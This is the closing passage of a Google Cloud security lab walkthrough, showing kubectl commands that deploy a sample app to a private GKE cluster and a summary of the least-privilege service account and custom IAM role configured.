sudo apt-get install google-cloud-sdk-gke-gcloud-auth-plugin

kubectl create deployment hello-server --image=gcr.io/google-samples/hello-app:1.0
```



Check that an application has been deployed to a private Kubernetes Engine cluster.



Check my progress



### Congratulations!

In this lab, you have configured a new Kubernetes Engine private cluster that is configured to use a dedicated service account with the least privileges required to run the cluster. You have also created a custom IAM role that provides the permissions required to create and update storage objects in Google Cloud Storage buckets and bound that role to the service account used by the cluster. You also validated that the cluster is working correctly by deploying a simple application to the cluster to test that management access to the cluster using the `kubectl` tool is working from the `orca-jumphost` compute instance.

![Implement Cloud Security Fundamentals on Google Cloud badge](images/LJBXHCk%2FXoRpaS5OxvXGPf3kIqERA7gTiNnmrpa2wzQ%3D.png)









